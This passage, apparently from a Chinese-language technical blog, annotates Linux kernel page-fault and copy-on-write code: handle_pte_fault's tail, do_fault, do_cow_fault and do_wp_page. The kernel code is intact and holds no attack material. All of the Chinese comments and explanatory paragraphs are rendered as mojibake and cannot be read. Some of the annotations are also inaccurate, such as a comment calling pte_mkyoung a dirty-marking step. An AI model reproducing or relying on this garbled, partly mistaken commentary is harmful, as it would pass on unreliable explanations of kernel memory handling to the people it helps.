pte_alloc_one_map() */</span><br>		<span class="hljs-keyword">if</span> (pmd_trans_unstable(fe-&gt;pmd) || pmd_devmap(*fe-&gt;pmd))<br>			<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * A regular pmd is established and it can&#x27;t morph into a huge</span><br><span class="hljs-comment">		 * pmd from under us anymore at this point because we hold the</span><br><span class="hljs-comment">		 * mmap_sem read mode and khugepaged takes it in write mode.</span><br><span class="hljs-comment">		 * So now it&#x27;s safe to run pte_offset_map().</span><br><span class="hljs-comment">		 */</span><br>		fe-&gt;pte = pte_offset_map(fe-&gt;pmd, fe-&gt;address);<span class="hljs-comment">//ä½¿ç”¨ pte_offset_map å‡½æ•°è·å–ç»™å®šè™šæ‹Ÿåœ°å€çš„é¡µè¡¨é¡¹æŒ‡é’ˆï¼Œå¹¶è¯»å–è¯¥é¡µè¡¨é¡¹çš„å†…å®¹åˆ° entry å˜é‡ä¸­ã€‚</span><br><br>		entry = *fe-&gt;pte;<br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * some architectures can have larger ptes than wordsize,</span><br><span class="hljs-comment">		 * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and</span><br><span class="hljs-comment">		 * CONFIG_32BIT=y, so READ_ONCE or ACCESS_ONCE cannot guarantee</span><br><span class="hljs-comment">		 * atomic accesses.  The code below just needs a consistent</span><br><span class="hljs-comment">		 * view for the ifs and we later double check anyway with the</span><br><span class="hljs-comment">		 * ptl lock held. So here a barrier will do.</span><br><span class="hljs-comment">		 */</span><br>		barrier();<br>		<span class="hljs-keyword">if</span> (pte_none(entry)) &#123;<span class="hljs-comment">//æ£€æŸ¥é¡µè¡¨é¡¹æ˜¯å¦ä¸ºç©ºï¼ˆæŒ‡å‘çš„ç‰©ç†é¡µæ¡†æ˜¯å¦å­˜åœ¨ï¼‰ï¼Œå¦‚æœä¸ºç©ºï¼Œåˆ™é‡Šæ”¾ä¹‹å‰æ˜ å°„çš„é¡µè¡¨é¡¹å¹¶å°† fe-&gt;pte è®¾ä¸ºç©ºã€‚</span><br>			pte_unmap(fe-&gt;pte);<br>			fe-&gt;pte = <span class="hljs-literal">NULL</span>;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (!fe-&gt;pte) &#123;<span class="hljs-comment">//å¦‚æœ fe-&gt;pte ä¸ºç©ºï¼Œåˆ™è¯´æ˜é¡µé¢ä¸å­˜åœ¨ï¼Œæ ¹æ® VMAï¼ˆVirtual Memory Areaï¼‰æ˜¯å¦åŒ¿åæ‰§è¡Œä¸åŒçš„é¡µé¢å¤„ç†æ“ä½œã€‚</span><br>		<span class="hljs-keyword">if</span> (vma_is_anonymous(fe-&gt;vma))<br>			<span class="hljs-keyword">return</span> do_anonymous_page(fe);<br>		<span class="hljs-keyword">else</span><br>			<span class="hljs-keyword">return</span> do_fault(fe);<span class="hljs-comment">//åˆ†é…ç‰©ç†é¡µæ¡†</span><br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (!pte_present(entry))<span class="hljs-comment">//å¦‚æœé¡µé¢å·²ç»äº¤æ¢åˆ°ç£ç›˜ä¸Šï¼Œåˆ™æ‰§è¡Œäº¤æ¢é¡µé¢å¤„ç†æ“ä½œ</span><br>		<span class="hljs-keyword">return</span> do_swap_page(fe, entry);<br><br>	<span class="hljs-keyword">if</span> (pte_protnone(entry) &amp;&amp; vma_is_accessible(fe-&gt;vma))<span class="hljs-comment">//å¦‚æœé¡µé¢æ˜¯ä¿æŠ¤çš„ï¼Œå¹¶ä¸” VMA æ˜¯å¯è®¿é—®çš„ï¼Œåˆ™æ‰§è¡Œ NUMAï¼ˆNon-Uniform Memory Accessï¼‰é¡µé¢å¤„ç†æ“ä½œã€‚</span><br>		<span class="hljs-keyword">return</span> do_numa_page(fe, entry);<br><br>	fe-&gt;ptl = pte_lockptr(fe-&gt;vma-&gt;vm_mm, fe-&gt;pmd);<br>	spin_lock(fe-&gt;ptl);<span class="hljs-comment">//è‡ªæ—‹é”</span><br>	<span class="hljs-keyword">if</span> (unlikely(!pte_same(*fe-&gt;pte, entry)))<br>		<span class="hljs-keyword">goto</span> unlock;<br>	<span class="hljs-keyword">if</span> (fe-&gt;flags &amp; FAULT_FLAG_WRITE) &#123;<span class="hljs-comment">//å­˜åœ¨ FAULT_FLAG_WRITE æ ‡å¿—ä½ï¼Œè¡¨ç¤ºç¼ºé¡µå¼‚å¸¸ç”±å†™æ“ä½œå¼•èµ·</span><br>		<span class="hljs-keyword">if</span> (!pte_write(entry))<span class="hljs-comment">//å¯¹åº”çš„é¡µä¸å¯å†™</span><br>			<span class="hljs-keyword">return</span> do_wp_page(fe, entry);<span class="hljs-comment">//è¿›è¡Œå†™æ—¶å¤åˆ¶ï¼Œå°†å†…å®¹å†™å…¥ç”± do_fault()-&gt;do_cow_fault()åˆ†é…çš„å†…å­˜é¡µä¸­</span><br>		entry = pte_mkdirty(entry);<br>	&#125;<br>	entry = pte_mkyoung(entry);<span class="hljs-comment">//å°†è¯¥é¡µã€æ ‡è„ã€‘</span><br>	<span class="hljs-keyword">if</span> (ptep_set_access_flags(fe-&gt;vma, fe-&gt;address, fe-&gt;pte, entry,<br>				fe-&gt;flags &amp; FAULT_FLAG_WRITE)) &#123;<br>		update_mmu_cache(fe-&gt;vma, fe-&gt;address, fe-&gt;pte);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * This is needed only for protection faults but the arch code</span><br><span class="hljs-comment">		 * is not yet telling us if this is a protection fault or not.</span><br><span class="hljs-comment">		 * This still avoids useless tlb flushes for .text page faults</span><br><span class="hljs-comment">		 * with threads.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (fe-&gt;flags &amp; FAULT_FLAG_WRITE)<br>			flush_tlb_fix_spurious_fault(fe-&gt;vma, fe-&gt;address);<br>	&#125;<br>unlock:<br>	pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<span class="hljs-comment">//è§£è‡ªæ—‹é”</span><br>	<span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure>

<p>ç¬¬ä¸€æ¬¡ç¼ºé¡µå¼‚å¸¸çš„å¤„ç†æµç¨‹åŒ…æ‹¬ï¼š</p>
<ul>
<li>æ£€æŸ¥é¡µé¢å¯¹åº”çš„é¡µè¡¨é¡¹æ˜¯å¦ä¸ºç©ºï¼Œè‹¥ä¸ºç©ºåˆ™è¡¨ç¤ºè¯¥é¡µé¢æœªä¸ç‰©ç†é¡µå»ºç«‹æ˜ å°„å…³ç³»ã€‚</li>
<li>å¦‚æœé¡µè¡¨é¡¹ä¸ºç©ºï¼Œè¯´æ˜é¡µé¢å¯èƒ½æ˜¯è¿›ç¨‹ç¬¬ä¸€æ¬¡è®¿é—®ï¼Œéœ€è¦åˆ†é…ä¸€ä¸ªæ–°çš„ç‰©ç†é¡µï¼Œå¹¶å°†å†…å®¹åˆå§‹åŒ–ä¸º0ã€‚</li>
<li>å¦‚æœé¡µè¡¨é¡¹ä¸ä¸ºç©ºï¼Œå¯èƒ½æ˜¯é¡µé¢å·²ç»è¢«æ¢å‡ºåˆ°äº¤æ¢ç©ºé—´ï¼Œéœ€è¦å°†å…¶äº¤æ¢å›æ¥ã€‚</li>
</ul>
<p>ç¬¬äºŒæ¬¡ç¼ºé¡µå¼‚å¸¸çš„å¤„ç†æµç¨‹åŒ…æ‹¬ï¼š</p>
<ul>
<li>æ£€æŸ¥é¡µé¢æ˜¯å¦åœ¨ä¸»å­˜ä¸­ï¼Œå¦‚æœåœ¨ä¸»å­˜ä¸­ï¼Œç»§ç»­å¤„ç†ï¼›å¦‚æœä¸åœ¨ä¸»å­˜ä¸­ï¼Œå¯èƒ½æ˜¯å› ä¸ºé¡µé¢è¢«æ¢å‡ºåˆ°äº¤æ¢ç©ºé—´ï¼Œéœ€è¦å°†å…¶äº¤æ¢å›æ¥ã€‚</li>
<li>å¦‚æœé¡µé¢åœ¨ä¸»å­˜ä¸­ï¼Œæ£€æŸ¥ç¼ºé¡µå¼‚å¸¸æ˜¯å¦ç”±å†™æ“ä½œå¼•èµ·ã€‚<ul>
<li>å¦‚æœæ˜¯å†™æ“ä½œå¼•èµ·çš„ç¼ºé¡µå¼‚å¸¸ï¼Œæ£€æŸ¥é¡µé¢æ˜¯å¦å¯å†™ï¼Œå¦‚æœä¸å¯å†™ï¼Œåˆ™æ‰§è¡Œå†™æ—¶å¤åˆ¶æ“ä½œï¼›å¦‚æœå¯å†™ï¼Œåˆ™æ ‡è®°é¡µé¢ä¸ºå·²ä¿®æ”¹ã€‚</li>
<li>å°†æ–°å†…å®¹å†™å…¥é¡µè¡¨é¡¹ä¸­ã€‚</li>
</ul>
</li>
</ul>
<p>å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºç»“è®ºï¼Œå½“ä¸€ä¸ªè¿›ç¨‹é¦–æ¬¡è®¿é—®ä¸€ä¸ªå†…å­˜é¡µæ—¶ï¼Œä¼šä¾æ¬¡è§¦å‘ä¸¤æ¬¡ç¼ºé¡µå¼‚å¸¸ï¼Œç¬¬ä¸€æ¬¡æ˜¯ä¸ºäº†å»ºç«‹é¡µé¢ä¸ç‰©ç†é¡µçš„æ˜ å°„å…³ç³»ï¼Œç¬¬äºŒæ¬¡æ˜¯ä¸ºäº†å¤„ç†é¡µé¢åœ¨ä¸»å­˜ä¸­çš„å†™æ“ä½œå¼•èµ·çš„ç¼ºé¡µå¼‚å¸¸ã€‚</p>
<h4 id="do-fault"><a href="#do-fault" class="headerlink" title="do_fault"></a>do_fault</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<span class="hljs-comment">//è·å–äº†æŒ‡å‘å½“å‰è™šæ‹Ÿå†…å­˜åŒºåŸŸï¼ˆVirtual Memory Areaï¼ŒVMAï¼‰çš„æŒ‡é’ˆ vma</span><br>	<span class="hljs-type">pgoff_t</span> pgoff = linear_page_index(vma, fe-&gt;address);<span class="hljs-comment">//è®¡ç®—é¡µé¢åç§»é‡ï¼Œè¯¥å°†çº¿æ€§åœ°å€è½¬æ¢ä¸ºé¡µé¢åç§»é‡</span><br><br>	<span class="hljs-comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span><br>	<span class="hljs-keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)<span class="hljs-comment">//æ£€æŸ¥äº† vma å¯¹è±¡æ˜¯å¦å…·æœ‰æœ‰æ•ˆçš„ fault æ“ä½œã€‚å¦‚æœ vma å¯¹è±¡ä¸­çš„ vm_ops ç»“æ„ä¸­çš„ fault å‡½æ•°æŒ‡é’ˆä¸ºç©ºï¼Œè¯´æ˜è¯¥è™šæ‹Ÿå†…å­˜åŒºåŸŸå¯èƒ½æœªå®Œå…¨åˆå§‹åŒ–æˆ–è€…ç¼ºå°‘ VM_DONTEXPAND æ ‡å¿—ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‡½æ•°è¿”å› VM_FAULT_SIGBUSï¼Œè¡¨ç¤ºå‘ç”Ÿäº†æ€»çº¿é”™è¯¯ã€‚</span><br>		<span class="hljs-keyword">return</span> VM_FAULT_SIGBUS;<br>	<span class="hljs-keyword">if</span> (!(fe-&gt;flags &amp; FAULT_FLAG_WRITE))<span class="hljs-comment">//å¦‚æœé¡µé¢é”™è¯¯ä¸æ˜¯å†™æ“ä½œï¼Œåˆ™è°ƒç”¨ do_read_fault å‡½æ•°å¤„ç†è¯»å–æ“ä½œã€‚</span><br>		<span class="hljs-keyword">return</span> do_read_fault(fe, pgoff);<br>	<span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))<span class="hljs-comment">//å¦‚æœè™šæ‹Ÿå†…å­˜åŒºåŸŸçš„æ ‡å¿—ä¸­ä¸åŒ…å« VM_SHARED æ ‡å¿—ï¼Œè¯´æ˜è¯¥åŒºåŸŸæ˜¯ç§æœ‰çš„ï¼Œå‡½æ•°è°ƒç”¨ do_cow_fault å‡½æ•°å¤„ç†å†™æ—¶å¤åˆ¶é”™è¯¯ï¼ˆCopy-On-Write Faultï¼‰ã€‚</span><br>		<span class="hljs-keyword">return</span> do_cow_fault(fe, pgoff);<br>	<span class="hljs-keyword">return</span> do_shared_fault(fe, pgoff);<span class="hljs-comment">//è™šæ‹Ÿå†…å­˜åŒºåŸŸæ˜¯å…±äº«çš„ï¼Œå‡½æ•°è°ƒç”¨ do_shared_fault å‡½æ•°å¤„ç†å…±äº«é”™è¯¯</span><br>&#125;<br><br></code></pre></td></tr></table></figure>

<h4 id="å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæ— å†…å­˜é¡µï¼‰-do-cow-fault"><a href="#å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæ— å†…å­˜é¡µï¼‰-do-cow-fault" class="headerlink" title="å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæ— å†…å­˜é¡µï¼‰: do_cow_fault()"></a>å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæ— å†…å­˜é¡µï¼‰: do_cow_fault()</h4><p>æœ¬ç¯‡ä¸»è¦å…³æ³¨å†™æ—¶å¤åˆ¶çš„è¿‡ç¨‹ï¼›<code>COW</code>æµç¨‹åœ¨ç¬¬ä¸€æ¬¡å†™æ—¶è§¦å‘ç¼ºé¡µå¼‚å¸¸æœ€ç»ˆä¾¿ä¼šè¿›å…¥åˆ° <code>do_cow_fault()</code> ä¸­å¤„ç†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_cow_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pgoff_t</span> pgoff)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">fault_page</span>, *<span class="hljs-title">new_page</span>;</span><br>	<span class="hljs-type">void</span> *fault_entry;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_cgroup</span> *<span class="hljs-title">memcg</span>;</span><br>	<span class="hljs-type">int</span> ret;<br><br>	<span class="hljs-keyword">if</span> (unlikely(anon_vma_prepare(vma)))<br>		<span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br>	new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, fe-&gt;address);<span class="hljs-comment">//ä¸ºå½“å‰è¿›ç¨‹åˆ†é…ä¸€ä¸ªæ–°çš„é¡µé¢</span><br>	<span class="hljs-keyword">if</span> (!new_page)<br>		<span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br>	<span class="hljs-keyword">if</span> (mem_cgroup_try_charge(new_page, vma-&gt;vm_mm, GFP_KERNEL,<span class="hljs-comment">//ä¸ºæ–°é¡µé¢åˆ†é…å†…å­˜èµ„æº</span><br>				&amp;memcg, <span class="hljs-literal">false</span>)) &#123;<br>		put_page(new_page);<br>		<span class="hljs-keyword">return</span> VM_FAULT_OOM;<br>	&#125;<br><br>	ret = __do_fault(fe, pgoff, new_page, &amp;fault_page, &amp;fault_entry);<span class="hljs-comment">//è¯»å–æ–‡ä»¶å†…å®¹åˆ°fault_page</span><br>	<span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>		<span class="hljs-keyword">goto</span> uncharge_out;<br><br>	<span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_DAX_LOCKED))<br>		copy_user_highpage(new_page, fault_page, fe-&gt;address, vma);<span class="hljs-comment">//æ‹·è´fault_pageå†…å®¹åˆ°new_page</span><br>	__SetPageUptodate(new_page);<br><br>	ret |= alloc_set_pte(fe, memcg, new_page);<span class="hljs-comment">//è®¾ç½®pteï¼Œç½®æ¢è¯¥è¿›ç¨‹ä¸­çš„pteè¡¨é¡¹ï¼Œå¯¹äºå†™æ“ä½œä¼šå°†è¯¥é¡µæ ‡è„ï¼ˆè¯¥å‡½æ•°ä¼šè°ƒç”¨maybe_mkwrite()å‡½æ•°ï¼Œå…¶ä¼šè°ƒç”¨pte_mkdirty()å‡½æ•°æ ‡è„è¯¥é¡µï¼‰</span><br>	<span class="hljs-keyword">if</span> (fe-&gt;pte)<br>		pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>	<span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_DAX_LOCKED)) &#123;<span class="hljs-comment">//é‡Šæ”¾fault_page</span><br>		unlock_page(fault_page);<br>		put_page(fault_page);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		dax_unlock_mapping_entry(vma-&gt;vm_file-&gt;f_mapping, pgoff);<br>	&#125;<br>	<span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>		<span class="hljs-keyword">goto</span> uncharge_out;<br>	<span class="hljs-keyword">return</span> ret;<br>uncharge_out:<br>	mem_cgroup_cancel_charge(new_page, memcg, <span class="hljs-literal">false</span>);<br>	put_page(new_page);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæœ‰å†…å­˜é¡µï¼‰ï¼šdo-wp-page"><a href="#å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæœ‰å†…å­˜é¡µï¼‰ï¼šdo-wp-page" class="headerlink" title="å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæœ‰å†…å­˜é¡µï¼‰ï¼šdo_wp_page"></a>å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæœ‰å†…å­˜é¡µï¼‰ï¼šdo_wp_page</h4><p>å½“é€šè¿‡ <code>do_fault()</code> è·å–å†…å­˜é¡µä¹‹åï¼Œç¬¬äºŒæ¬¡è§¦å‘ç¼ºé¡µå¼‚å¸¸æ—¶ä¾¿ä¼šæœ€ç»ˆäº¤ç”± <code>do_wp_page()</code> å‡½æ•°å¤„ç†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This routine handles present pages, when users try to write</span><br><span class="hljs-comment"> * to a shared page. It is done by copying the page to a new address</span><br><span class="hljs-comment"> * and decrementing the shared-page counter for the old page.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Note that this routine assumes that the protection checks have been</span><br><span class="hljs-comment"> * done by the caller (the low-level page fault routine in most cases).</span><br><span class="hljs-comment"> * Thus we can safely just mark it writable once we&#x27;ve done any necessary</span><br><span class="hljs-comment"> * COW.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * We also mark the page dirty at this point even though the page will</span><br><span class="hljs-comment"> * change only once the write actually happens. This avoids a few races,</span><br><span class="hljs-comment"> * and potentially makes it more efficient.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * We enter with non-exclusive mmap_sem (to exclude vma changes,</span><br><span class="hljs-comment"> * but allow concurrent faults), with pte both mapped and locked.</span><br><span class="hljs-comment"> * We return with mmap_sem still held, but pte unmapped and unlocked.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_wp_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pte_t</span> orig_pte)</span><br>	__<span class="hljs-title function_">releases</span><span class="hljs-params">(fe-&gt;ptl)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<span class="hljs-comment">//åŸæœ‰çš„é¡µ</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">old_page</span>;</span><br><br>	old_page = vm_normal_page(vma, fe-&gt;address, orig_pte);<span class="hljs-comment">//è·å–ç¼ºé¡µçš„çº¿æ€§åœ°å€å¯¹åº”çš„struct pageç»“æ„ï¼Œå¯¹äºä¸€äº›ç‰¹æ®Šæ˜ å°„çš„é¡µé¢ï¼ˆå¦‚é¡µé¢å›æ”¶ã€é¡µè¿ç§»å’ŒKSMç­‰ï¼‰ï¼Œå†…æ ¸å¹¶ä¸å¸Œæœ›è¿™äº›é¡µå‚ä¸åˆ°å†…å­˜ç®¡ç†çš„ä¸€äº›æµç¨‹å½“ä¸­ï¼Œç§°ä¹‹ä¸º special mappingï¼Œå¹¶æ— å¯¹åº”çš„struct pageç»“æ„ä½“</span><br>	<span class="hljs-keyword">if</span> (!old_page) &#123;<span class="hljs-comment">//NULLï¼Œè¯´æ˜æ˜¯ä¸€ä¸ª special mapping é¡µé¢ï¼›å¦åˆ™è¯´æ˜æ˜¯normal mappingé¡µé¢</span><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a</span><br><span class="hljs-comment">		 * VM_PFNMAP VMA.</span><br><span class="hljs-comment">		 *</span><br><span class="hljs-comment">		 * We should not cow pages in a shared writeable mapping.</span><br><span class="hljs-comment">		 * Just mark the pages writable and/or call ops-&gt;pfn_mkwrite.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==<br>				     (VM_WRITE|VM_SHARED))<br>			<span class="hljs-keyword">return</span> wp_pfn_shared(fe, orig_pte);<br><br>		pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>		<span class="hljs-keyword">return</span> wp_page_copy(fe, orig_pte, old_page);<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Take out anonymous pages first, anonymous shared vmas are</span><br><span class="hljs-comment">	 * not dirty accountable.</span><br><span class="hljs-comment">	 */</span><br>    <span class="hljs-comment">//å…ˆå¤„ç†åŒ¿åé¡µé¢</span><br>	<span class="hljs-keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123;<span class="hljs-comment">//åŸé¡µé¢ä¸ºåŒ¿åé¡µé¢ &amp;&amp; ä¸æ˜¯ksmé¡µé¢</span><br>		<span class="hljs-type">int</span> total_mapcount;<br>		<span class="hljs-keyword">if</span> (!trylock_page(old_page)) &#123;<span class="hljs-comment">//å¤šçº¿ç¨‹ç›¸å…³æ“ä½œï¼Œåˆ¤æ–­æ˜¯å¦æœ‰å…¶ä»–çº¿ç¨‹çš„ç«äº‰</span><br>			get_page(old_page);<br>			pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>			lock_page(old_page);<br>			fe-&gt;pte = pte_offset_map_lock(vma-&gt;vm_mm, fe-&gt;pmd,<br>					fe-&gt;address, &amp;fe-&gt;ptl);<br>			<span class="hljs-keyword">if</span> (!pte_same(*fe-&gt;pte, orig_pte)) &#123;<br>				unlock_page(old_page);<br>				pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>				put_page(old_page);<br>				<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>			&#125;<br>			put_page(old_page);<br>		&#125;<br>        <span class="hljs-comment">//æ­¤æ—¶æ²¡æœ‰å…¶ä»–çº¿ç¨‹ä¸æœ¬çº¿ç¨‹ç«äº‰äº†ï¼Œè°ƒç”¨ reuse_swap_page() åˆ¤æ–­ä½¿ç”¨è¯¥é¡µçš„æ˜¯å¦åªæœ‰ä¸€ä¸ªè¿›ç¨‹ï¼Œè‹¥æ˜¯çš„è¯å°±ç›´æ¥é‡ç”¨è¯¥é¡µ</span><br>		<span class="hljs-keyword">if</span> (reuse_swap_page(old_page, &amp;total_mapcount)) &#123;<br>			<span class="hljs-keyword">if</span> (total_mapcount == <span class="hljs-number">1</span>) &#123;<br>				<span class="hljs-comment">/*</span><br><span class="hljs-comment">				 * The page is all ours. Move it to</span><br><span class="hljs-comment">				 * our anon_vma so the rmap code will</span><br><span class="hljs-comment">				 * not search our parent or siblings.</span><br><span class="hljs-comment">				 * Protected against the rmap code by</span><br><span class="hljs-comment">				 * the page lock.</span><br><span class="hljs-comment">				 */</span><br>				page_move_anon_rmap(old_page, vma);<br>			&#125;<br>			unlock_page(old_page);<br>			<span class="hljs-keyword">return</span> wp_page_reuse(fe, orig_pte, old_page, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>		&#125;<br>		unlock_page(old_page);<br>	&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (unlikely((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==<br>					(VM_WRITE|VM_SHARED))) &#123;<br>		<span class="hljs-keyword">return</span> wp_page_shared(fe, orig_pte, old_page);<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Ok, we need to copy. Oh, well..</span><br><span class="hljs-comment">	 */</span><br>    <span class="hljs-comment">//å®åœ¨æ²¡æ³•é‡ç”¨äº†ï¼Œè¿›è¡Œå†™æ—¶å¤åˆ¶</span><br>	get_page(old_page);<br><br>	pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>	<span class="hljs-keyword">return</span> wp_page_copy(fe, orig_pte, old_page);<br>&#125;<br></code></pre></td></tr></table></figure>

